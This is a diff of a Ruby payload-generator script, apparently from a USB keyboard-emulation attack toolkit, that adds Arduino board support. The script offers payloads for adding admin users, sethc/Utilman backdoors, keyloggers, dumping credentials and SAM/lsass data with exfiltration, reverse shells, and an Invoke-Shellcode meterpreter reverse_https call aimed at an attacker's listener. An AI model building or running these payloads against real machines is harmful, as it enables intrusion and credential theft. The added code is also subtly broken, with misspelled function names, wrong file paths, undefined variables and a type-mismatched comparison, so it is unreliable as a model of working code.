@@ -2,13 +2,20 @@ require "rubygems"
 require 'bundler/setup'
 require "colored"
 require "highline/import"
-
+$board = ""
 def search_replace(filein,fileout,*param)
   file = File.read(filein)
   if (param[0] != "noexfil")
+    #$board = boardtype()
     exfilmethodscalls = File.read("./lib/src/exfilmethodscalls")
+	if ($board == "4")
+		exfilmethodscalls = File.read("./lib/src/arduino/exfilmethodscalls")
+	end
     input = file.gsub(/EXFILCALLS/,exfilmethodscalls)
     exfilmethodsdefs = File.read("./lib/src/exfilmethodsdefs")
+	if ($board == "4")
+		exfilmethodsdefs = File.read("./lib/src/arduino/exfilmethodsdefs")
+	end
     input = input.gsub(/EXFILDEFS/,exfilmethodsdefs)
   else
     input = file.gsub(/EXFILCALLS/,"")
@@ -25,17 +32,26 @@ def search_replace(filein,fileout,*param)
 
  if (param[param.length - 1] == "persist")
   persistmethodscalls = File.read("./lib/src/persistmethodscalls")
+  if ($board == "4")
+    persistmethodscalls = File.read("./lib/src/arduino/persistmethodscalls")	
+  end
   input = input.gsub(/PERSCALLS/,persistmethodscalls)
   persistmethodsdefs = File.read("./lib/src/persistmethodsdefs")
+  if ($board == "4")
+    persistmethodsdefs = File.read("./lib/src/arduino/persistmethodsdefs")
+  end
   input = input.gsub(/PERSDEFS/,persistmethodsdefs)
  else
   input = input.gsub(/PERSCALLS/,"")
   input = input.gsub(/PERSDEFS/,"")
  end
- board = boardtype()
+ #$board = boardtype()
  teensydefsfile = File.read("./lib/src/methodsdefs")
+ if ($board == "4")
+    teensydefsfile = File.read("./lib/src/arduino/methodsdefs")
+ end 
  input = input.gsub(/DEFS/,teensydefsfile)
- input = input.gsub(/BOARDTYPE/,board)
+ input = input.gsub(/BOARDTYPE/,$board)
  file = File.new(fileout,"w")
  File.open(fileout,"w") {|f| f.puts input}
  file.close
@@ -51,14 +67,17 @@ def input(userinput)
   value = gets.chomp()
   return value
 end
-
+#modified by me to insert new board type
 def boardtype()
-  board = input("Select the board type you want to use: Teesny++ 2.0 (Press 2), Teensy 3 (Press 3): ")
-  if (board == "2")
+  $board = input("Select the board type you want to use: Teesny++ 2.0 (Press 2), Teensy 3 (Press 3), Arduino Micro/Leonardo (Press 4): ")
+  if ($board == "2")
     "TEENSY2"
-  elsif (board == "3")
+  elsif ($board == "3")
     "TEENSY3"
+  elsif ($board == "4")
+    "ARDUINO"
   end
+  return $board
 end
 
 def outoption()
@@ -128,40 +147,70 @@ def windows_add_user()
   puts"\nThis payload adds a user with Administrative privs on the target machine.".bold
   username = input("Enter Username for the user to be added: ")
   password = input_pass("Enter Password for the user to be added: ")
-  search_replace("./lib/src/user_add.pde","#$output_path/output/user_add.pde",username,password)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/user_add.pde","#$output_path/output/user_add.pde",username,password)
+  else
+    search_replase("./lib/src/user_add.pde","#$output_path/output/user_add.pde",username,password)
+  end
 end
 
 def default_dns()
   puts"\nThis payload changes the Primary DNS server on the target machine.".bold
   ip = input("Enter the IP to be set as Primary DNS: ")
-  search_replace("./lib/src/default_dns.pde","#$output_path/output/default_dns.pde",ip)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/default_dns.pde","#$output_path/output/default_dns.pde",ip)
+  else
+    search_replace("./lib/src/default_dns.pde","#$output_path/output/default_dns.pde",ip)
+  end
 end
 
 def edit_hosts()
   puts"\nThis payload can be used to make entries to the hosts file on the target machine".bold
   domain = input("Enter the domain name to be resolved: ")
   ip = input("Enter the IP the domain name is to be resolved: ")
-  search_replace("./lib/src/edit_hosts.pde","#$output_path/output/edit_hosts.pde",ip,domain)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/edit_hosts.pde","#$output_path/output/edit_hosts.pde",ip,domain)
+  else
+    search_replace("./lib/src/edit_hosts.pde","#$output_path/output/edit_hosts.pde",ip,domain)
+  end
 end
 
 def enable_rdp()
   puts"\nThis payload adds an Administrative User, Starts RDP Service and adds exception to Windows firewall.".bold
   username = input("Enter Username for the user to be added: ")
   password = input_pass("Enter password for the user to be added: ")
-  search_replace("./lib/src/enable_rdp.pde","#$output_path/output/enable_rdp.pde",username,password)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/enable_rdp.pde","#$output_path/output/enable_rdp.pde",username,password)
+  else
+    search_replece("./lib/src/enable_rdp.pde","#$output_path/output/enable_rdp.pde",username,password)
+  end
 end
 
 def enable_telnet()
   puts"\nThis payload adds an Administrative User, installs and starts telnet server and adds exception to Windows firewall.".bold
   username = input("Enter Username for the user to be added: ")
   password = input_pass("Enter password for the user to be added: ")
-  search_replace("./lib/src/enable_telnet.pde","#$output_path/output/enable_telnet.pde",username,password)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/enable_telnet.pde","#$output_path/output/enable_telnet.pde",username,password)
+  else
+    search_replace("./lib/src/enable_telnet.pde","#$output_path/output/enable_telnet.pde",username,password)
+  end
 end
 
 def force_browse()
   puts"\nThis payload browses silently a given URL using Internet Explorer".bold
   url = input("Enter the URL to open: ")
-  search_replace("./lib/src/force_browse.pde","#$output_path/output/force_browse.pde",url)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/force_browse.pde","#$output_path/output/force_browse.pde",url)
+  else
+    search_replace("./lib/src/force_browse.ped","#$output_path/output/force_browse.pde",url)
+  end
 end
 
 def download_execute()
@@ -169,7 +218,12 @@ def download_execute()
   puts"You must manually convert and upload an exe to text.".bold
   puts"You should use the powershell script (../extras/exetottxt.ps1) for conversion.".bold
   url = input("Enter the URL where your exe is pasted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
-  search_replace("./lib/src/download_exec.pde","#$output_path/output/download_exec.pde",url)
+  $board = boardtype()
+  if ($board =="4")
+    search_replace("./lib/src/arduino/download_exec.pde","#$output_path/output/download_exec.pde",url)
+  else
+    search_replace("./lib/src/download_exec.pde","#$output_path/output/download_exec.pde",url)
+  end
 end
 
 def backdoor()
@@ -177,22 +231,38 @@ def backdoor()
   puts"Pressing Shift 5 times or pressing 'Windows Key + U' on a locked system will run the defined executable with SYSTEM privileges.".bold
   sethc = input("Enter the path of executable to replace sethc (Use triple backslash like C:\\\\\\windows\\\\\\system32\\\\\\cmd.exe): ")
   utilman = input("Enter the path of executable to replace Utilman (Use triple backslash like C:\\\\\\windows\\\\\\system32\\\\\\cmd.exe): ")
-  search_replace("./lib/src/backdoor.pde","#$output_path/output/backdoor.pde",sethc,utilman)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/backdoor.pde","#$output_path/output/backdoor.pde",sethc,utilman)
+  else
+    search_replace("./lib/src/backdoor.pde","#$output_path/output/backdoor.pde",sethc,utilman)
+  end
 end
 
 def uninstall()
   puts"\nThis payload unsinstalls the given application.".bold
   puts"Application name should be same as it appears in Registry and it should be msiexec compatible.".bold
   app = input("Enter the name of the app to uninstall: ")
-  search_replace("./lib/src/uninstall.pde","#$output_path/output/uninstall.pde",app)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/uninstall.pde","#$output_path/output/uninstall.pde",app)
+  else
+    search_replace("./lib/src/uninstall.pde","#$output_path/output/uninstall.pde",app)
+  end
 end
 
 
 def info()
   puts"\nThis payload dumps lots of useful information from target system and exfiltrates that using an exfiltration method of choice.".bold
   puts"Information like registry keys, output of net command, contents of hosts file etc.".bold
+  puts"Board"<<$board
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/info.pde","#$output_path/output/info.pde",outopt,username,password,devkey)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/info.pde","#$output_path/output/info.pde",outopt,username,password,devkey)
+  else
+    search_replace("./lib/src/info.pde","#$output_path/output/info.pde",outopt,username,password,devkey)
+  end
 end
 
 def hashdump_powershelldown()
@@ -202,7 +272,12 @@ def hashdump_powershelldown()
   puts"You can find the script at ../extras/hashdump_download.ps1 \n".bold
   url  = input("Enter the URL where you have pasted hashdump_download script (for pastebin use raw format like http://pastebin.com/raw.php?i=YeMYP68J): " )
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/hashdump_powershelldown.pde","#$output_path/output/hashdump_powershelldown.pde",outopt,username,password,devkey,url)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/hashdump_powershelldown.pde","#$output_path/output/hashdump_powershelldown.pde",outopt,username,password,devkey,url)
+  else
+    search_replace("./lib/src/hashdump_powershelldown.pde","#$output_path/output/hashdump_powershelldown.pde",outopt,username,password,devkey,url)
+  end
 end
 
 def keylogger()
@@ -213,7 +288,12 @@ def keylogger()
   stopstring = input("The string, if responded in the checkurl, will stop the payload: ")
   outopt,username,password,devkey = outoption()
   persist = input("Do you want the payload to be reboot persistent? Enter y/n: ")
-  search_replace("./lib/src/keylogger.pde","#$output_path/output/keylogger.pde",outopt,username,password,devkey,time,checkurl,stopstring,persist)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/keylogger.pde","#$output_path/output/keylogger.pde",outopt,username,password,devkey,time,checkurl,stopstring,persist)
+  else
+    search_replace("./lib/src/keylogger.pde","#$output_path/output/keylogger.pde",outopt,username,password,devkey,time,checkurl,stopstring,persist)
+  end
 end
 
 def sniffer()
@@ -225,7 +305,12 @@ def sniffer()
   username = input("Enter username for the ftp server: ")
   password = input_pass("Enter password for the ftp server: ")
   server = input("Enter IP address of the ftp server: ")
-  search_replace("./lib/src/sniffer.pde","#$output_path/output/sniffer.pde",url,time,username,password,server)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/sniffer.pde","#$output_path/output/sniffer.pde",url,time,username,password,server)
+  else
+    search_replace("./lib/src/sniffer.pde","#$output_path/output/sniffer.pde",url,time,username,password,server) 
+  end
 end
 
 def rogue_ap()
@@ -241,7 +326,14 @@ def rogue_ap()
   key_init = "Keyboard.println(\"echo "
   key_end = " >> %temp%\\\\\\ce.ps1\");\n"
   input = ""
-  File.foreach("./lib/src/rogue_ap.pde") do |line|
+  path1 = ""
+  $board = boardtype()
+  if ($board == "4")
+    path1 = "./lib/src/arduino/rogue_ap.pde"
+  else
+    path1 = "./lib/src/rogue_ap.pde"
+  end
+  File.foreach(path1) do |line|
     if (line =~ /SHELLCODE/)
       shellcode.each do |codeline|
         input = input + key_init
@@ -251,18 +343,29 @@ def rogue_ap()
     end
   end
   input = file.gsub(/SHELLCODE/,input)
-  File.open("./lib/src/rogue_ap.tmp","w") {|f| f.puts input}
+  path2 = ""
+  if ($board == "4")
+    path2 = "./lib/src/arduino/rogue_ap.tmp"
+  else
+    path2 = "./lib/src/rogue_ap.tmp"
+  end
+  File.open(path2,"w") {|f| f.puts input}
   ssid = input("Enter the SSID for the hosted network to be added: ")
   key = input_pass("Enter the key (min 8 chracters) for the network: ")
   port = input("Enter the port on which bind shell will listen: ")
-  search_replace("./lib/src/rogue_ap.tmp","#$output_path/output/rogue_ap.pde",ssid,key,port)
+  search_replace(path2,"#$output_path/output/rogue_ap.pde",ssid,key,port)
 end
 
 def signed_applet()
   puts"\nThis payload silently browses to a url where java_signed_applet exploit from msf is listening and accepts the Warning.".bold
   puts"You have to manually setup a listener for java_signed_applet exploit."
   url  = input("Enter the URL where Java Signed Applet server is running: ")
-  search_replace("./lib/src/signed_applet.pde","#$output_path/output/signed_applet.pde",url)
+  board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/signed_applet.pde","#$output_path/output/signed_applet.pde",url)
+  else 
+    search_replace("./lib/src/signed_applet.pde","#$output_path/output/signed_applet.pde",url)
+  end
 end
 
 def force_wifi()
@@ -276,7 +379,12 @@ def force_wifi()
   hex_ssid = "#{ssid}".unpack('H*').join
   key = input_pass(" Enter the key for the SSID: ")
   url  = input("Enter the URL where msf payload is saved in text format: ")
-  search_replace("./lib/src/force_wificonnect.ino","#$output_path/output/force_wificonnect.ino", ssid, hex_ssid, key, url)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/force_wificonnect.ino","#$output_path/output/force_wificonnect.ino", ssid, hex_ssid, key, url)
+  else
+    search_replace("./lib/src/force_wificonnect.ino","#$output_path/output/force_wificonnect.ino", ssid, hex_ssid, key, url)
+  end
 end
 
 def powershell_codeexec()
@@ -290,7 +398,14 @@ def powershell_codeexec()
   key_init = "Keyboard.println(\"echo "
   key_end = " >> %temp%\\\\\\ce.ps1\");\n"
   input = ""
-  File.foreach("./lib/src/powershell_codeexec.pde") do |line|
+  path1 = ""
+  $board = boardtype()
+  if ($board == "4")
+    path1 = "./lib/src/arduino/powershell_codeexec.pde"
+  else
+    path1 = ".lib/src/powershell_codeexec.pde"
+  end
+  File.foreach(path1) do |line|
     if (line =~ /SHELLCODE/)
       shellcode.each do |codeline|
         input = input + key_init
@@ -300,8 +415,14 @@ def powershell_codeexec()
     end
   end
   input = file.gsub(/SHELLCODE/,input)
-  File.open("./lib/src/powershell_codeexec.tmp","w") {|f| f.puts input}
-  search_replace("./lib/src/powershell_codeexec.tmp","#$output_path/output/powershell_codeexec.pde","")
+  path2 = ""
+  if ($board == 4)
+    path2 = "./lib/src/arduino/powershell_codeexec.tmp"
+  else
+    path2 = "./lib/src/powershell_codeexec.tmp"
+  end
+  File.open(path2,"w") {|f| f.puts input}
+  search_replace(path2,"#$output_path/output/powershell_codeexec.pde","")
 end
 
 def time_based_exec()
@@ -312,13 +433,22 @@ def time_based_exec()
   payloadurl = input("Enter the url from where the powershell script would be downloaded (use \"raw\" url in case of pastebin): ")
   stopstring = input("Enter the string which will work as stopstring: ")
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/time_based_exec.ino","#$output_path/output/time_based_exec.ino",outopt,username,password,devkey,time,payloadurl,stopstring)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/time_based_exec.ino","#$output_path/output/time_based_exec.ino",outopt,username,password,devkey,time,payloadurl,stopstring)
+  else
+    search_replace("./lib/src/time_based_exec.ino","#$output_path/output/time_based_exec.ino",output,username,password,devkey,time,playloaddurl,stopstring)
+  end
 end
 
 def wlan_keys()
   puts"\nThis payload dumps wlan keys in plain text from target system and exfiltrates the keys using method of choice.".bold
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/wlan_key.ino","#$output_path/output/wlan_key.ino",outopt,username,password,devkey)
+  if ($board == "4")
+    search_replace("./lib/src/arduino/wlan_key.ino","#$output_path/output/wlan_key.ino",outopt,username,password,devkey)
+  else
+    search_replace("./lib/src/wlan_key.ino","#$output_path/output/wlan_key.ino",outopt,username,password,devkey)
+  end
 end
 
 def credentials()
@@ -326,7 +456,12 @@ def credentials()
   puts"\nThe credenitals could then be posted to pastebin, gmail or tinypaste.".bold
   puts"You must register an account with pastebin/tinypaste/gmail to post credentials.".bold
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/credentials.ino","#$output_path/output/credentials.ino",outopt,username,password,devkey)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/credentials.ino","#$output_path/output/credentials.ino",outopt,username,password,devkey)
+  else
+    search_replace("./lib/src/credentials.ino","#$output_path/output/credentials.ino",outopt,username,password,devkey)
+  end
 end
 
 def dns_txt_codeexec()
@@ -337,8 +472,12 @@ def dns_txt_codeexec()
   puts"The payload needs to be generated using the command in payloadgen.txt in extras directory."
   domain32 = input("Enter the domain whose TXT record will serve 32 bit shellcode (e.g. 32.example.com) : ")
   domain64 = input("Enter the domain whose TXT record will serve 64 bit shellcode (e.g. 64.example.com) ")
-  search_replace("./lib/src/dns_code_exec.ino","#$output_path/output/dns_code_exec.ino",domain32, domain64)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/dns_code_exec.ino","#$output_path/output/dns_code_exec.ino",domain32, domain64)
+  else
+    search_replace("./lib/src/dns_code_exec.ino","#$output_path/output/dns_code_exec.ino",domain32, domain64)
+  end
 end
 
 
@@ -352,15 +491,23 @@ def ncsi()
   webcontent = input("Enter the content of above file which NCSI will check: ")
   dnshost = input("Enter the domain name which NCSI will probe over DNS (you can enter space here): ")
   dnscontent  = input("Enter the IP address to which above domain name should resolve to (you can enter space here): ")
-  search_replace("./lib/src/ncsi.ino","#$output_path/output/ncsi.ino", webhost,webpath,webcontent,dnshost,dnscontent)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/ncsi.ino","#$output_path/output/ncsi.ino", webhost,webpath,webcontent,dnshost,dnscontent)
+  else
+    search_replace("./lib/src/ncsi.ino","#$output_path/output/ncsi.ino", webhost, webpath, webcontent, dnshost, dnscontent)
+  end
 end
 
 def speak()
   puts"\nThis payload \"speaks\" the given sentence on the target.".bold
   sentence = input("Enter senetence to be \"spoken\": ")
-  search_replace("./lib/src/speak.ino","#$output_path/output/speak.ino", sentence)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/speak.ino","#$output_path/output/speak.ino", sentence)
+  else
+    search_replace("./lib/src/speak.ino","#$output_path/output/speak.ino", sentence)
+  end
 end
 
 def http_backdoor()
@@ -374,8 +521,12 @@ def http_backdoor()
   stopstring = input("Enter the string which will work as stopstring: ")
   outopt,username,password,devkey = outoption()
   persist = persistence()
-  search_replace("./lib/src/http_backdoor.ino","#$output_path/output/http_backdoor.ino", outopt,username,password,devkey,checkurl,magicstring,payloadurl,stopstring,persist)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/http_backdoor.ino","#$output_path/output/http_backdoor.ino", outopt,username,password,devkey,checkurl,magicstring,payloadurl,stopstring,persist)
+  else
+    search_replace("./lib/src/http_backdoor.ino","#$output_path/output/http_backdoor.ino", outopt,username,password,devkey,cehckurl,magicstring,payloadurl,stopstring,persist)
+  end
 end
 
 def dns_txt_backdoor
@@ -393,21 +544,36 @@ def dns_txt_backdoor
   authns = input("IP address of the Auhtorized Name Server of domains being used in above options: ")
   outopt,username,password,devkey = outoption()
   persist = persistence()
-  search_replace("./lib/src/dns_txt_backdoor.ino","#$output_path/output/dns_txt_backdoor.ino",outopt,username,password,devkey,startdomain,startcommand,commanddomain,startps,psdomain,stopstring,authns,persist)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/dns_txt_backdoor.ino","#$output_path/output/dns_txt_backdoor.ino",outopt,username,password,devkey,startdomain,startcommand,commanddomain,startps,psdomain,stopstring,authns,persist)
+  else
+    search_replace("./lib/src/dns_tct_backdoor.ino","#$output_path/output/dns_txt_backdoor.ino",outopt,username,password,devkey,startdomain,startcommand,commanddomain,startps,psdomain,stopstring,authns,persist)
+  end
 end
 
 def download_execute_ps()
   puts"\nThis payload downloads a powershell script from a url and executes it in memory.".bold
   url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
   arg = input("Enter the arguments to pass to the script: ")
-  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/download_execute_ps.ino",url,arg)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/download_execute_ps.ino","#$output_path/output/download_execute_ps.ino",url,arg)
+  else
+    search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/download_execute_ps.ino",url,arg)
+  end
 end
 
 def remove_update()
   puts"\nPayload which silently removes updates for a target machine".bold
   puts"\nIt could be used to remove all updates, all security updates or a particular update."
   option = input("Enter \"All\" to remove all updates, \"Security\" to remove all security updates or a KBID (e.g. KB958644): ")
-  search_replace("./lib/src/remove_update.ino","#$output_path/output/remove_update.ino",option)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/remove_update.ino","#$output_path/output/remove_update.ino",option)
+  else
+    search_replace("./lib/src/remove_update.ino","#$output_path/output/remove_update.ino",option)
+  end
 end
 
 def lsa_secrets()
@@ -417,8 +583,12 @@ def lsa_secrets()
   puts"You can find the script at ../extras/lsa_secrets.ps1 \n".bold
   url  = input("Enter the URL where you have pasted lsa_secrets script (for pastebin use raw format like http://pastebin.com/raw.php?i=ukhX7RSV): " )
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/lsa_secrets.ino","#$output_path/output/lsa_secrets.ino",outopt,username,password,devkey,url)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/lsa_secrets.ino","#$output_path/output/lsa_secrets.ino",outopt,username,password,devkey,url)
+  else
+    search_replace("./lib/src/lsa_secrets.ino","#$output_path/output/lsa_secrets.ino",outopt,username,password,devkey,url)
+  end
 end
 
 def screenshot()
@@ -431,7 +601,12 @@ def screenshot()
   password = input_pass("Enter password for the ftp server: ")
   server = input("Enter IP address of the ftp server: ")
   directory = input("Name of the directory on the FTP Server where screenshots could be uploaded: ")
-  search_replace("./lib/src/screenshot.ino","#$output_path/output/screenshot.ino",screeninterval,time,username,password,server,directory)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/screenshot.ino","#$output_path/output/screenshot.ino",screeninterval,time,username,password,server,directory)
+  else
+    search_replace("./lib/src/screenshot.ino","#$output_path/output/screenshot.ino",screeninterval,time,username,password,server,directory)
+  end
 end
 
 def invoke_shellcode
@@ -444,7 +619,12 @@ def invoke_shellcode
   ip = input("Enter the IP address of metasploit listener: ")
   port = input("Enter the port of the metasploit listener: ")
   arg = "(Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost #{ip} -Lport #{port} -Force)"
-  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/invoke_shellcode.ino",url,arg)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/download_execute_ps.ino","#$output_path/output/invoke_shellcode.ino",url,arg)
+  else
+    search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/invoke_shellcode.ino",url,arg)
+  end
 end
 
 def dump_passwords()
@@ -458,7 +638,12 @@ def dump_passwords()
     arg = "Invoke-Mimikatz"
   end
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/dump_passwords.ino","#$output_path/output/dump_passwords.ino",outopt,username,password,devkey,url,arg)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/dump_passwords.ino","#$output_path/output/dump_passwords.ino",outopt,username,password,devkey,url,arg)
+  else
+    search_replace("./lib/src/dump_passwords.ino","#$output_path/output/dump_passwords.ino",outopt,username,password,devkey,url,arg)
+  end
 end
 
 def vss()
@@ -466,7 +651,12 @@ def vss()
   puts"\n The SAM file could be exfiltrated only using gmail."
   outopt,username,password,devkey = outoption()
   if (outopt == "gmail" or outopt == "noexfil")
-    search_replace("./lib/src/vss.ino","#$output_path/output/vss.ino",outopt,username,password,devkey)
+    $board = boardtype()
+    if ($board == "4")
+      search_replace("./lib/src/arduino/vss.ino","#$output_path/output/vss.ino",outopt,username,password,devkey)
+    else
+      search_replace("./lib/src/vss.ino","#$output_path/output/vss.ino",outopt,username,password,devkey)
+    end
   elsif
     puts"\n Please use gmail as SAM file would be sent as an attachment.".bold
   end
@@ -483,7 +673,12 @@ def memdump()
     arg = "lsass"
   end
   if (outopt == "gmail" or outopt == "noexfil")
-    search_replace("./lib/src/memdump.ino","#$output_path/output/memdump.ino",outopt,username,password,devkey,arg)
+    $board = boardtype()
+    if ($board == "4")
+      search_replace("./lib/src/arduino/memdump.ino","#$output_path/output/memdump.ino",outopt,username,password,devkey,arg)
+    else
+      search_replace("./lib/src/memdump.ino","#$output_path/output/memdump.ino",outopt,username,password,devkey,arg)
+    end
   elsif
     puts"\n Please use gmail as the dump file would be sent as an attachment.".bold
   end
@@ -495,14 +690,24 @@ def getvault
   puts"The code has been taken from Get-VaultCredential.ps1 from Powersploit (https://github.com/mattifestation/PowerSploit/)"
   url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
   outopt,username,password,devkey = outoption()
-  search_replace("./lib/src/getvault.ino","#$output_path/output/getvault.ino",outopt,username,password,devkey,url)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/getvault.ino","#$output_path/output/getvault.ino",outopt,username,password,devkey,url)
+  else
+    search_replace("./lib/src/getvault.ino","#$output_path/output/getvault.ino",outopt,username,password,devkey,url)
+  end
 end
 
 def enable_psremoting
   puts"\nThis payload adds an Administrative User, configures Powershell remoting and adds exception to Windows firewall.".bold
   username = input("Enter Username for the user to be added: ")
   password = input_pass("Enter password for the user to be added: ")
-  search_replace("./lib/src/enable_psremoting.ino","#$output_path/output/enable_psremoting.ino",username,password)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/enable_psremoting.ino","#$output_path/output/enable_psremoting.ino",username,password)
+  else
+    search_replace("./lib/src/enable_psremoting.ino","#$output_path/output/enable_psremoting.ino",username,password)
+  end
 end
 
 def linux_download_execute
@@ -510,7 +715,12 @@ def linux_download_execute
   puts"You must manually convert and upload an elf to text.".bold
   puts"The payload needs to be generated using the command in linux_payloadgen.txt in extras directory.".bold
   url = input("Enter the URL where your elf is pasted (if using pastebin use raw url  http://pastebin.com/raw.php?i=NfiBdUp9): ")
-  search_replace("./lib/src/linux_download_exec.ino","#$output_path/output/linux_download_exec.ino",url)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/linux_download_exec.ino","#$output_path/output/linux_download_exec.ino",url)
+  else
+    search_replace("./lib/src/linux_download_exec.ino","#$output_path/output/linux_download.exec.ino",url)
+  end
 end
 
 def linux_builtin_reverse_shells
@@ -519,7 +729,12 @@ def linux_builtin_reverse_shells
   port1 = input("Enter the port number on which the listener one is listening (use port > 1024): ")
   ip2 = input("Enter the IP address of the machine where a listener one is running: ")
   port2 = input("Enter the port number on which the listener is listening (use port > 1024): ")
-  search_replace("./lib/src/linux_builtin_reverse_shells.ino","#$output_path/output/linux_builtin_reverse_shells.ino",ip1, port1,ip2,port2)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/linux_builtin_reverse_shells.ino","#$output_path/output/linux_builtin_reverse_shells.ino",ip1, port1,ip2,port2)
+  else
+    search_replace("./lib/src/linux_builtin_reverse_shells.ino","#$output_path/output/linux_builtin_reverse_shells.ino",ip1, port1,ip2,port2)
+  end
 end
 
 def linux_keylogger()
@@ -529,7 +744,12 @@ def linux_keylogger()
   username = input("Enter username for the pastebin account where keys will be uploaded: ")
   password = input_pass("Enter passowrd for the pastebin account where keys will be uploaded: ")
   devkey = input("Enter api dev key (available after registration with pastebin) for the pastebin account where keys will be uploaded: ")
-  search_replace("./lib/src/linux_keylogger.ino","#$output_path/output/linux_keylogger.ino",username,password,devkey)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/linux_keylogger.ino","#$output_path/output/linux_keylogger.ino",username,password,devkey)
+  else
+    search_replace("./lib/src/linux_keylogger.ino","#$output_path/output/linux_keylogger.ino",username,password,devkey)
+  end
 end
 
 def linux_codeexec()
@@ -537,11 +757,17 @@ def linux_codeexec()
   puts"\nThis payload executes shellcode using xxd.".bold
   puts"Currently, to use this payload you need to copy payload to linux_codeexec.txt in src directory."
   puts"The payload needs to be generated using the command in linux_payloadgen.txt in extras directory."
-
-  file = File.read("./lib/src/linux_codeexec.ino")
-  input=""
-  filein = "./lib/src/linux_codeexec.txt"
+  input = ""
+  filein = ""
   fileout = "#$output_path/output/linux_codeexec.ino"
+  $board = boardtype()
+  if ($board == "4")
+    file = File.read("./lib/src/linux_codeexec.ino")
+    filein = "./lib/src/linux_codeexec.txt"
+  else
+    file = File.read("./lib/src/linux_codeexec.ino")
+    filein = "./lib/src/linux_codeexec.txt"
+  end
   i=0
   File.foreach(filein) do |line|
   line = line.gsub(/\n/,"")
@@ -565,7 +791,12 @@ def linux_dns_txt_codeexec()
   puts"\nThis payload downloads code from a DNS TXT record and executes it.".bold
   puts"\nThe TXT record must be Base64 encoded. A good example could be using a perl one liner, base64 encoded."
   domain = input("Enter the domain whose TXT record will serve shellcode/command : ")
-  search_replace("./lib/src/linux_dns_txt_codeexec.ino","#$output_path/output/linux_dns_txt_codeexec.ino",domain)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/linux_dns_txt_codeexec.ino","#$output_path/output/linux_dns_txt_codeexec.ino",domain)
+  else
+    search_replace("./lib/src/linux_dns_txt_codeexec.ino","#$output_path/output/linux_dns_txt_codeexec.ino",domain)
+   end
 end
 
 def linux_perl_reverse_shell()
@@ -573,8 +804,12 @@ def linux_perl_reverse_shell()
   puts"\nPerl comes installed by default in Ubuntu."
   ip = input("Enter the IP address of the machine where the listener is running: ")
   port = input("Enter the port number on which the listener is listening (use port > 1024): ")
-  search_replace("./lib/src/linux_perl_reverse_shell.ino","#$output_path/output/linux_perl_reverse_shell.ino",ip, port)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/linux_perl_reverse_shell.ino","#$output_path/output/linux_perl_reverse_shell.ino",ip, port)
+  else
+    search_replace("./lib/src/linux_perl_reverse_shell.ino","#$output_path/output/linux_perl_reverse_shell.ino",ip, port)
+  end
 end
 
 def osx_download_execute()
@@ -582,15 +817,24 @@ def osx_download_execute()
   puts"You must manually convert and upload a shellcode to text.".bold
   puts"The payload needs to be generated using the commands in osx_payloadgen.txt in extras directory.".bold
   url = input("Enter the URL where the shellcode is pasted (if using pastebin use raw url e.g. http://pastebin.com/raw.php?i=NfiBdUp9): ")
-  search_replace("./lib/src/osx_download_exec.ino","#$output_path/output/osx_download_exec.ino",url)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/osx_download_exec.ino","#$output_path/output/osx_download_exec.ino",url)
+  else 
